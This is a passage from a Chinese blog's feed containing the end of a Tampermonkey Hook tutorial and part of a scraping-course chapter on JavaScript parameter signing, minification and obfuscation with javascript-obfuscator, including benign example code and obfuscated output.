方法、<code>decode</code>方法、<code>stringify</code> 方法、<code>log</code> 方法、<code>alert</code> 方法等，简单又高效。</p><h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>以上便是通过 Tampermonkey 实现简单 Hook 的基础操作，当然这仅仅是一个常见的基础案例，我们可以从中总结出一些 Hook 的基本门道。</p><p>由于本节涉及到一些专有名词，部分内容参考如下：</p><ul>  <li>博客 - Hook 技术：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zMzgyY2M3NjViMzk=">https://www.jianshu.com/p/3382cc765b39<i class="fa fa-external-link-alt"></i></span>。</li>  <li>官网 - Tampermonkey 官网：<span class="exturl" data-url="aHR0cDovL3d3dy50YW1wZXJtb25rZXkubmV0Lw==">http://www.tampermonkey.net/<i class="fa fa-external-link-alt"></i></span></li>  <li>文档 - Base64 编码：<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQVBJL1dpbmRvd09yV29ya2VyR2xvYmFsU2NvcGUvYnRvYQ==">https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/btoa<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 202
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="JavaScript" scheme="https://cuiqingcai.com/tags/JavaScript/"/>
    
      <category term="逆向" scheme="https://cuiqingcai.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Hook" scheme="https://cuiqingcai.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - JavaScript 网站加密和混淆技术简介</title>
    <link href="https://cuiqingcai.com/2022111.html"/>
    <id>https://cuiqingcai.com/2022111.html</id>
    <published>2022-03-05T06:11:52.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>随着大数据时代的发展，各个公司的数据保护意识越来越强，大家都在想尽办法保护自家产品的数据不轻易被爬虫爬走。由于网页是提供信息和服务的重要载体，所以对网页上的信息进行保护就成了至关重要的一个环节。</p><p>网页是运行在浏览器端的，当我们浏览一个网页时，其 HTML 代码、 JavaScript 代码都会被下载到浏览器中执行。借助浏览器的开发者工具，我们可以看到网页在加载过程中所有网络请求的详细信息，也能清楚地看到网站运行的 HTML 代码和 JavaScript 代码，这些代码中就包含了网站加载的全部逻辑，如加载哪些资源、请求接口是如何构造的、页面是如何渲染的等等。正因为代码是完全透明的，所以如果我们能够把其中的执行逻辑研究出来，就可以模拟各个网络请求进行数据爬取了。</p><p>然而，事情没有想象得那么简单。随着前端技术的发展，前端代码的打包技术、混淆技术、加密技术也层出不穷，借助于这些技术，各个公司可以在前端对 JavaScript 代码采取一定的保护，比如变量名混淆、执行逻辑混淆、反调试、核心逻辑加密等，这些保护手段使得我们没法很轻易地找出 JavaScript 代码中包含的的执行逻辑。</p><p>在前几章的案例中，我们也试着爬取了各种形式的网站。其中有的网站的数据接口是没有任何验证或加密参数的，我们可以轻松模拟并爬取其中的数据；但有的网站稍显复杂，网站的接口中增加了一些加密参数，同时对 JavaScript 代码采取了上文所述的一些防护措施，当时我们没有直接尝试去破解，而是用 Selenium 等类似工具来实现模拟浏览器执行的方式来进行“所见即所得“的爬取。其实对于后者，我们还有另外一种解决方案，那就是直接逆向 JavaScript 代码，找出其中的加密逻辑，从而直接实现该加密逻辑来进行爬取。如果加密逻辑实在过于复杂，我们也可以找出一些关键入口，从而实现对加密逻辑的单独模拟执行和数据爬取。这些方案难度可能很大，比如关键入口很难寻找，或者加密逻辑难以模拟，可是一旦成功找到突破口，我们便可以不用借助于 Selenium 等工具进行整页数据的渲染而实现数据爬取，这样爬取效率会大幅提升。</p><p>本章我们首先会对 JavaScript 防护技术进行介绍，然后介绍一些常用的 JavaScript 逆向技巧，包括浏览器工具的使用、Hook 技术、AST 技术、特殊混淆技术的处理、WebAssembly 技术的处理。了解了这些技术，我们可以更从容地应对 JavaScript 防护技术。</p><h2 id="1-引入"><a href="#1-引入" class="headerlink" title="1. 引入"></a>1. 引入</h2><p>我们在爬取网站的时候，会遇到一些情况需要分析一些接口或 URL 信息，在这个过程中，我们会遇到各种各样类似加密的情形，比如说：</p><ul>  <li>某个网站的 URL 带有一些看不太懂的长串加密参数，要抓取就必须要懂得这些参数是怎么构造的，否则我们连完整的 URL 都构造不出来，更不用说爬取了。</li>  <li>分析某个网站的 Ajax 接口的时候，可以看到接口的一些参数也是加密的，或者 Request Headers 里面也可能带有一些加密参数，如果不知道这些参数的具体构造逻辑就没法直接用程序来模拟这些 Ajax 请求。</li>  <li>翻看网站的 JavaScript 源代码，可以发现很多压缩了或者看不太懂的字符，比如 JavaScript 文件名被编码，JavaScript 的文件内容都压缩成几行，JavaScript 变量也被修改成单个字符或者一些十六进制的字符，导致我们不好轻易根据 JavaScript 找出某些接口的加密逻辑。</li></ul><p>这些情况呢，基本上都是网站为了保护其本身的一些数据不被轻易抓取而采取的一些措施，我们可以把它归类为两大类：</p><ul>  <li>URL/API 参数加密</li>  <li>JavaScript 压缩、混淆和加密</li></ul><p>这一节我们就来了解下这两类技术的基本原理和一些常见的示例。知己知彼，百战不殆，了解了这些技术的实现原理之后，我们才能更好地去逆向其中的逻辑，从而实现数据爬取。</p><h2 id="2-网站数据防护方案"><a href="#2-网站数据防护方案" class="headerlink" title="2. 网站数据防护方案"></a>2. 网站数据防护方案</h2><p>当今大数据时代，数据已经变得越来越重要，网页和 App 现在是主流的数据载体，如果其数据的 API 没有设置任何保护措施，在爬虫工程师解决了一些基本的反爬如封 IP、验证码的问题之后，那么数据还是可以被轻松爬取到的。</p><p>那么，有没有可能在 URL/API 层面或 JavaScript 层面也加上一层防护呢？答案是可以。</p><h3 id="URL-API-参数加密"><a href="#URL-API-参数加密" class="headerlink" title="URL/API 参数加密"></a>URL/API 参数加密</h3><p>网站运营者首先想到防护措施可能是对某些数据接口的参数进行加密，比如说对某些 URL 的一些参数加上校验码或者把一些 id 信息进行编码，使其变得难以阅读或构造；或者对某些 API 请求加上一些 token、sign 等签名，这样这些请求发送到服务器时，服务器会通过客户端发来的一些请求信息以及双方约定好的秘钥等来对当前的请求进行校验，如果校验通过，才返回对应数据结果。</p><p>比如说客户端和服务端约定一种接口校验逻辑，客户端在每次请求服务端接口的时候都会附带一个 sign 参数，这个 sign 参数可能是由当前时间信息、请求的 URL、请求的数据、设备的 ID、双方约定好的秘钥经过一些加密算法构造而成的，客户端会实现这个加密算法构造 sign，然后每次请求服务器的时候附带上这个参数。服务端会根据约定好的算法和请求的数据对 sign 进行校验，如果校验通过，才返回对应的数据，否则拒绝响应。</p><p>当然登录状态的校验也可以看作是此类方案，比如一个 API 的调用必须要传一个 token，这个 token 必须用户登录之后才能获取，如果请求的时候不带该 token，API 就不会返回任何数据。</p><p>倘若没有这种措施，那么基本上 URL 或者 API 接口是完全公开可以访问的，这意味着任何人都可以直接调用来获取数据，几乎是零防护的状态，这样是非常危险的，而且数据也可以被轻易地被爬虫爬取。因此对 URL/API 参数一些加密和校验是非常有必要的。</p><h3 id="JavaScript-压缩、混淆和加密"><a href="#JavaScript-压缩、混淆和加密" class="headerlink" title="JavaScript 压缩、混淆和加密"></a>JavaScript 压缩、混淆和加密</h3><p>接口加密技术看起来的确是一个不错的解决方案，但单纯依靠它并不能很好地解决问题。为什么呢？</p><p>对于网页来说，其逻辑是依赖于 JavaScript 来实现的，JavaScript 有如下特点：</p><ul>  <li>JavaScript 代码运行于客户端，也就是它必须要在用户浏览器端加载并运行。</li>  <li>JavaScript 代码是公开透明的，也就是说浏览器可以直接获取到正在运行的 JavaScript 的源码。</li></ul><p>由于这两个原因，至使 JavaScript 代码是不安全的，任何人都可以读、分析、复制、盗用，甚至篡改。</p><p>所以说，对于上述情形，客户端 JavaScript 对于某些加密的实现是很容易被找到或模拟的，了解了加密逻辑后，模拟参数的构造和请求也就是轻而易举了，所以如果 JavaScript 没有做任何层面的保护的话，接口加密技术基本上对数据起不到什么防护作用。</p><p>如果你不想让自己的数据被轻易获取，不想他人了解 JavaScript 逻辑的实现，或者想降低被不怀好意的人甚至是黑客攻击。那么就需要用到 JavaScript 压缩、混淆和加密技术了。</p><p>这里压缩、混淆和加密技术简述如下：</p><ul>  <li>代码压缩：即去除 JavaScript 代码中的不必要的空格、换行等内容，使源码都压缩为几行内容，降低代码可读性，当然同时也能提高网站的加载速度。</li></ul><ul>  <li>代码混淆：使用变量替换、字符串阵列化、控制流平坦化、多态变异、僵尸函数、调试保护等手段，使代码变地难以阅读和分析，达到最终保护的目的。但这不影响代码原有功能。是理想、实用的 JavaScript 保护方案。</li>  <li>代码加密：可以通过某种手段将 JavaScript 代码进行加密，转成人无法阅读或者解析的代码，如借用 WebAssembly 技术，可以直接将 JavaScript 代码用 C/C++ 实现，JavaScript 调用其编译后形成的文件来执行相应的功能。</li></ul><p>下面我们对上面的技术分别予以介绍。</p><h2 id="3-URL-API-参数加密"><a href="#3-URL-API-参数加密" class="headerlink" title="3. URL/API 参数加密"></a>3. URL/API 参数加密</h2><p>现在绝大多数网站的数据一般都是通过服务器提供的 API 来获取的，网站或 App 可以请求某个数据 API 获取到对应的数据，然后再把获取的数据展示出来。但有些数据是比较宝贵或私密的，这些数据肯定是需要一定层面上的保护。所以不同 API 的实现也就对应着不同的安全防护级别，我们这里来总结下。</p><p>为了提升接口的安全性，客户端会和服务端约定一种接口校验方式，一般来说会使用到各种加密和编码算法，如 Base64、Hex 编码，MD5、AES、DES、RSA 等对称或非对称加密。</p><p>举个例子，比如说客户端和服务器双方约定一个 sign 用作接口的签名校验，其生成逻辑是客户端将 URL Path 进行 MD5 加密然后拼接上 URL 的某个参数再进行 Base64 编码，最后得到一个字符串 sign，这个 sign 会通过 Request URL 的某个参数或 Request Headers 发送给服务器。服务器接收到请求后，对 URL Path 同样进行 MD5 加密，然后拼接上 URL 的某个参数，也进行 Base64 编码也得到了一个 sign，然后比对生成的 sign 和客户端发来的 sign 是否是一致的，如果是一致的，那就返回正确的结果，否则拒绝响应。这就是一个比较简单的接口参数加密的实现。如果有人想要调用这个接口的话，必须要定义好 sign 的生成逻辑，否则是无法正常调用接口的。</p><p>当然上面的这个实现思路比较简单，这里还可以增加一些时间戳信息增加时效性判断，或增加一些非对称加密进一步提高加密的复杂程度。但不管怎样，只要客户端和服务器约定好了加密和校验逻辑，任何形式加密算法都是可以的。</p><p>这里要实现接口参数加密就需要用到一些加密算法，客户端和服务器肯定也都有对应的 SDK 实现这些加密算法，如 JavaScript 的 crypto-js，Python 的 hashlib、Crypto 等等。</p><p>但还是如上文所说，如果是网页的话，客户端实现加密逻辑如果是用 JavaScript 来实现，其源代码对用户是完全可见的，如果没有对 JavaScript 做任何保护的话，是很容易弄清楚客户端加密的流程的。</p><p>因此，我们需要对 JavaScript 利用压缩、混淆等方式来对客户端的逻辑进行一定程度上的保护。</p><h2 id="4-JavaScript-压缩"><a href="#4-JavaScript-压缩" class="headerlink" title="4. JavaScript 压缩"></a>4. JavaScript 压缩</h2><p>这个非常简单，JavaScript 压缩即去除 JavaScript 代码中的不必要的空格、换行等内容或者把一些可能公用的代码进行处理实现共享，最后输出的结果都压缩为几行内容，代码可读性变得很差，同时也能提高网站加载速度。</p><p>如果仅仅是去除空格换行这样的压缩方式，其实几乎是没有任何防护作用的，因为这种压缩方式仅仅是降低了代码的直接可读性。如果我们有一些格式化工具可以轻松将 JavaScript 代码变得易读，比如利用 IDE、在线工具或 Chrome 浏览器都能还原格式化的代码。</p><p>比如这里举一个最简单的 JavaScript 压缩示例，原来的 JavaScript 代码是这样的：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">stringA, stringB</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">"Germey"</span>;</span><br><span class="line">  alert(<span class="string">"hello "</span> + name);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>压缩之后就变成这样子：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">d, c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> e = <span class="string">"Germey"</span>;</span><br><span class="line">  alert(<span class="string">"hello "</span> + e);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到这里参数的名称都被简化了，代码中的空格也被去掉了，整个代码也被压缩成了一行，代码的整体可读性降低了。</p><p>目前主流的前端开发技术大多都会利用 Webpack、Rollup 等工具进行打包，Webpack、Rollup 会对源代码进行编译和压缩，输出几个打包好的 JavaScript 文件，其中我们可以看到输出的 JavaScript 文件名带有一些不规则字符串，同时文件内容可能只有几行内容，变量名都是一些简单字母表示。这其中就包含 JavaScript 压缩技术，比如一些公共的库输出成 bundle 文件，一些调用逻辑压缩和转义成冗长的几行代码，这些都属于 JavaScript 压缩。另外其中也包含了一些很基础的 JavaScript 混淆技术，比如把变量名、方法名替换成一些简单字符，降低代码可读性。</p><p>但整体来说，JavaScript 压缩技术只能在很小的程度上起到防护作用，要想真正提高防护效果还得依靠 JavaScript 混淆和加密技术。</p><h2 id="5-JavaScript-混淆"><a href="#5-JavaScript-混淆" class="headerlink" title="5. JavaScript 混淆"></a>5. JavaScript 混淆</h2><p>JavaScript 混淆是完全是在 JavaScript 上面进行的处理，它的目的就是使得 JavaScript 变得难以阅读和分析，大大降低代码可读性，是一种很实用的 JavaScript 保护方案。</p><p>JavaScript 混淆技术主要有以下几种：</p><ul>  <li>    <p>变量混淆：将带有含义的变量名、方法名、常量名随机变为无意义的类乱码字符串，降低代码可读性，如转成单个字符或十六进制字符串。</p>  </li>  <li>    <p>字符串混淆：将字符串阵列化集中放置、并可进行 MD5 或 Base64 加密存储，使代码中不出现明文字符串，这样可以避免使用全局搜索字符串的方式定位到入口点。</p>  </li>  <li>    <p>属性加密：针对 JavaScript 对象的属性进行加密转化，隐藏代码之间的调用关系。</p>  </li>  <li>    <p>控制流平坦化：打乱函数原有代码执行流程及函数调用关系，使代码逻变得混乱无序。</p>  </li>  <li>    <p>无用代码注入：随机在代码中插入不会被执行到的无用代码，进一步使代码看起来更加混乱。</p>  </li>  <li>    <p>调试保护：基于调试器特性，对当前运行环境进行检验，加入一些强制调试 debugger 语句，使其在调试模式下难以顺利执行 JavaScript 代码。</p>  </li>  <li>    <p>多态变异：使 JavaScript 代码每次被调用时，将代码自身即立刻自动发生变异，变化为与之前完全不同的代码，即功能完全不变，只是代码形式变异，以此杜绝代码被动态分析调试。</p>  </li>  <li>    <p>锁定域名：使 JavaScript 代码只能在指定域名下执行。</p>  </li>  <li>    <p>反格式化：如果对 JavaScript 代码进行格式化，则无法执行，导致浏览器假死。</p>  </li>  <li>    <p>特殊编码：将 JavaScript 完全编码为人不可读的代码，如表情符号、特殊表示内容等等。</p>  </li></ul><p>总之，以上方案都是 JavaScript 混淆的实现方式，可以在不同程度上保护 JavaScript 代码。</p><p>在前端开发中，现在 JavaScript 混淆主流的实现是 javascript-obfuscator (<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phdmFzY3JpcHQtb2JmdXNjYXRvci9qYXZhc2NyaXB0LW9iZnVzY2F0b3I=">https://github.com/javascript-obfuscator/javascript-obfuscator<i class="fa fa-external-link-alt"></i></span>) 和 terser (<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlcnNlci90ZXJzZXI=">https://github.com/terser/terser<i class="fa fa-external-link-alt"></i></span>) 这两个库，其都能提供一些代码混淆功能，也都有对应的 Webpack 和 Rollup 打包工具的插件，利用它们我们可以非常方便地实现页面的混淆，最终可以输出压缩和混淆后的 JavaScript 代码，使得 JavaScript 代码可读性大大降低。</p><p>下面我们以 javascript-obfuscator 为例来介绍一些代码混淆的实现，了解了实现，那么自然我们就对混淆的机理有了更加深刻的认识。</p><p>javascript-obfuscator 的官网地址为：<span class="exturl" data-url="aHR0cHM6Ly9vYmZ1c2NhdG9yLmlvL++8jOWFtuWumOaWueS7i+e7jeWGheWuueWmguS4i++8mg==">https://obfuscator.io/，其官方介绍内容如下：<i class="fa fa-external-link-alt"></i></span></p><blockquote>  <p>A free and efficient obfuscator for JavaScript (including ES2017). Make your code harder to copy and prevent people from stealing your work.</p></blockquote><p>它是支持 ES8 的免费、高效的 JavaScript 混淆库，它可以使得你的 JavaScript 代码经过混淆后难以被复制、盗用，混淆后的代码具有和原来的代码一模一样的功能。</p><p>怎么使用呢？首先，我们需要安装好 Node.js 12.x 版本及以上，确保可以正常使用 npm 命令，具体的安装方式可以参考：<span class="exturl" data-url="aHR0cHM6Ly9zZXR1cC5zY3JhcGUuY2VudGVyL25vZGVqc+OAgg==">https://setup.scrape.center/nodejs。<i class="fa fa-external-link-alt"></i></span></p><p>接着新建一个文件夹，比如 js-obfuscate，然后进入该文件夹，初始化工作空间：</p><figure class="highlight shell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">npm init</span><br></pre>      </td>    </tr>  </table></figure><p>这里会提示我们输入一些信息，创建一个 package.json 文件，这就完成了项目初始化了。</p><p>接下来我们来安装 javascript-obfuscator 这个库：</p><figure class="highlight shell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">npm i -D javascript-obfuscator</span><br></pre>      </td>    </tr>  </table></figure><p>稍等片刻，即可看到本地 js-obfuscate 文件夹下生成了一个 node_modules 文件夹，里面就包含了 javascript-obfuscator 这个库，这就说明安装成功了，文件夹结构如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/viunz.png" alt="image-20210612155500985"></p><p>接下来我们就可以编写代码来实现一个混淆样例了，如新建一个 main.js 文件，内容如下：</p><figure class="highlight js">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let x = '1' + 1</span></span><br><span class="line"><span class="string">console.log('x', x)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  controlFlowFlattening: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obfuscator = <span class="built_in">require</span>(<span class="string">"javascript-obfuscator"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params">code, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obfuscator.obfuscate(code, options).getObfuscatedCode();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obfuscate(code, options));</span><br></pre>      </td>    </tr>  </table></figure><p>在这里我们定义了两个变量，一个是 code，即需要被混淆的代码，另一个是混淆选项，是一个 Object。接下来我们引入了 javascript-obfuscator 这库，然后定义了一个方法，传入 code 和 options，来获取混淆后的代码，最后控制台输出混淆后的代码。</p><p>代码逻辑比较简单，我们来执行一下代码：</p><figure class="highlight shell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">node main.js</span><br></pre>      </td>    </tr>  </table></figure><p>输出结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x53bf = [<span class="string">"log"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x1d84fe, _0x3aeda0</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x10a5a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2f0a52</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x2f0a52) &#123;</span><br><span class="line">      _0x1d84fe[<span class="string">"push"</span>](_0x1d84fe[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x10a5a(++_0x3aeda0);</span><br><span class="line">&#125;)(_0x53bf, <span class="number">0x172</span>);</span><br><span class="line"><span class="keyword">var</span> _0x480a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4341e5, _0x5923b4</span>) </span>&#123;</span><br><span class="line">  _0x4341e5 = _0x4341e5 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0xb3622e = _0x53bf[_0x4341e5];</span><br><span class="line">  <span class="keyword">return</span> _0xb3622e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x480a(<span class="string">"0x0"</span>)](<span class="string">"x"</span>, x);</span><br></pre>      </td>    </tr>  </table></figure><p>看到了吧，那么简单的两行代码，被我们混淆成了这个样子，其实这里我们就是设定了一个「控制流平坦化」的选项。整体看来，代码的可读性大大降低，也大大加大了 JavaScript 调试的难度。</p><p>好，那么我们来跟着 javascript-obfuscator 走一遍，就能具体知道 JavaScript 混淆到底有多少方法了。</p><blockquote>  <p>注意：由于这些例子中，调用 javascript-obfuscator 进行混淆的实现是一样的，所以下文的示例只说明 code 和 options 变量的修改，完整代码请自行补全。</p></blockquote><h3 id="代码压缩"><a href="#代码压缩" class="headerlink" title="代码压缩"></a>代码压缩</h3><p>这里 javascript-obfuscator 也提供了代码压缩的功能，使用其参数 compact 即可完成 JavaScript 代码的压缩，输出为一行内容。默认是 true，如果定义为 false，则混淆后的代码会分行显示。</p><p>示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let x = '1' + 1</span></span><br><span class="line"><span class="string">console.log('x', x)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先把代码压缩 compact 选项设置为 false，运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[<span class="string">"log"</span>](<span class="string">"x"</span>, x);</span><br></pre>      </td>    </tr>  </table></figure><p>如果不设置 compact 或把 compact 设置为 true，结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x151c = [<span class="string">"log"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x1ce384, _0x20a7c7</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x25fc92 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x188aec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x188aec) &#123;</span><br><span class="line">      _0x1ce384[<span class="string">"push"</span>](_0x1ce384[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x25fc92(++_0x20a7c7);</span><br><span class="line">&#125;)(_0x151c, <span class="number">0x1b7</span>);</span><br><span class="line"><span class="keyword">var</span> _0x553e = <span class="function"><span class="keyword">function</span> (<span class="params">_0x259219, _0x241445</span>) </span>&#123;</span><br><span class="line">  _0x259219 = _0x259219 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x56d72d = _0x151c[_0x259219];</span><br><span class="line">  <span class="keyword">return</span> _0x56d72d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> x = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x553e(<span class="string">"0x0"</span>)](<span class="string">"x"</span>, x);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到单行显示的时候，对变量名进行了进一步的混淆，这里变量的命名都变成了 16 进制形式的字符串，这是因为启用了一些默认压缩和混淆配置导致的。总之我们可以看到代码的可读性相比之前大大降低了。</p><h3 id="变量名混淆"><a href="#变量名混淆" class="headerlink" title="变量名混淆"></a>变量名混淆</h3><p>变量名混淆可以通过在 javascript-obfuscator 中配置 identifierNamesGenerator 参数实现，我们通过这个参数可以控制变量名混淆的方式，如 hexadecimal 则会替换为 16 进制形式的字符串，在这里我们可以设定如下值：</p><ul>  <li>hexadecimal：将变量名替换为 16 进制形式的字符串，如 <code>0xabc123</code>。</li>  <li>mangled：将变量名替换为普通的简写字符，如 <code>a</code>、<code>b</code>、<code>c</code> 等。</li></ul><p>该参数的值默认为 hexadecimal。</p><p>我们将该参数修改为 mangled 来试一下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let hello = '1' + 1</span></span><br><span class="line"><span class="string">console.log('hello', hello)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">true</span>,</span><br><span class="line">  identifierNamesGenerator: <span class="string">"mangled"</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> a = [<span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span> (<span class="params">f</span>) 